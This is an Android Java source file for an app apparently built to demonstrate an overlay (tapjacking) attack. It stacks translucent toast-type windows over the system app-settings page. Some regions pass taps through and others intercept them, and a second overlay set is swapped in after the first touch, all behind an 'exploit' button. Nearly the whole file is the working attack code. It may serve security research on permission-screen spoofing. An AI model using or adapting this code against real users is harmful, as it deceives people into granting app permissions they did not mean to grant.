package net.babdcatha.permissiondisguise;

import androidx.appcompat.app.AppCompatActivity;
import androidx.constraintlayout.widget.ConstraintLayout;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    int type = WindowManager.LayoutParams.TYPE_TOAST;
    int flags = 0;

    ConstraintLayout main_layout;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button launchPermission = findViewById(R.id.launchPermission);
        Button resetPermission = findViewById(R.id.reset);
        Button showToast = findViewById(R.id.showToast);
        Button exploit = findViewById(R.id.exploit);

        Context context = this;

        //Layout used to size the different views appropriately
        main_layout = findViewById(R.id.main_layout);

        launchPermission.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                Uri uri = Uri.fromParts("package", getApplicationContext().getPackageName(), null);
                intent.setData(uri);
                context.startActivity(intent);

            }
        });

        resetPermission.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                ((ActivityManager)context.getSystemService(ACTIVITY_SERVICE)).clearApplicationUserData();
            }
        });

        showToast.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                WindowManager mWindowManager = (WindowManager) getApplication().getSystemService(Context.WINDOW_SERVICE);

                createFirstAttackOverlay(context, mWindowManager);

            }
        });

        exploit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                WindowManager mWindowManager = (WindowManager) getApplication().getSystemService(Context.WINDOW_SERVICE);

                createFirstAttackOverlay(context, mWindowManager);

                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                Uri uri = Uri.fromParts("package", getApplicationContext().getPackageName(), null);
                intent.setData(uri);
                context.startActivity(intent);

            }
        });

    }

    void createFirstAttackOverlay(Context context, WindowManager mWindowManager){

        View view1;
        View view2;
        View view3;

        view1 = View.inflate(context, R.layout.unclickable_layout, null);
        WindowManager.LayoutParams layoutParams1 = new WindowManager.LayoutParams(main_layout.getLayoutParams().width,
                1225,
                0, 0,
                type,
                flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                        | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT
        );
        layoutParams1.gravity=Gravity.LEFT|Gravity.TOP;

        view2 = View.inflate(context, R.layout.clickable_layout, null);
        WindowManager.LayoutParams layoutParams2 = new WindowManager.LayoutParams(main_layout.getLayoutParams().width,
                250,
                0, 1225,
                type,
                flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.TRANSLUCENT
        );

        layoutParams2.gravity=Gravity.LEFT|Gravity.TOP;

        view3 = View.inflate(context, R.layout.unclickable_layout, null);
        WindowManager.LayoutParams layoutParams3 = new WindowManager.LayoutParams(main_layout.getLayoutParams().width,
                835,
                0, 1475,
                type,
                flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, //TODO : Make it unclickable
                PixelFormat.TRANSLUCENT
        );

        layoutParams3.gravity=Gravity.LEFT|Gravity.TOP;

        mWindowManager.addView(view1, layoutParams1);
        mWindowManager.addView(view2, layoutParams2);
        mWindowManager.addView(view3, layoutParams3);

        view1.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View view, MotionEvent motionEvent) {
                if(motionEvent.getAction() == MotionEvent.ACTION_OUTSIDE) {

                    createSecondAttackOverlay(context, mWindowManager);

                    //Waiting 100ms, to be sure that the second page of overlays is finished rendering
                    view1.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            mWindowManager.removeView(view1);
                            mWindowManager.removeView(view2);
                            mWindowManager.removeView(view3);
                        }
                    }, 100);

                    return true;
                }
                return false;
            }
        });
    }

    void createSecondAttackOverlay(Context context, WindowManager mWindowManager){

        View view1;
        View view2;

        view1 = View.inflate(context, R.layout.unclickable_layout, null);
        WindowManager.LayoutParams layoutParams1 = new WindowManager.LayoutParams(main_layout.getLayoutParams().width,
                400,
                0, 0,
                type,
                flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                        | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT
        );
        layoutParams1.gravity=Gravity.LEFT|Gravity.TOP;

        view2 = View.inflate(context, R.layout.unclickable_layout, null);
        WindowManager.LayoutParams layoutParams2 = new WindowManager.LayoutParams(1200,
                200,
                0, 400,
                type,
                flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT
        );
        layoutParams2.gravity=Gravity.LEFT|Gravity.TOP;

        mWindowManager.addView(view1, layoutParams1);
        mWindowManager.addView(view2, layoutParams2);

    }

}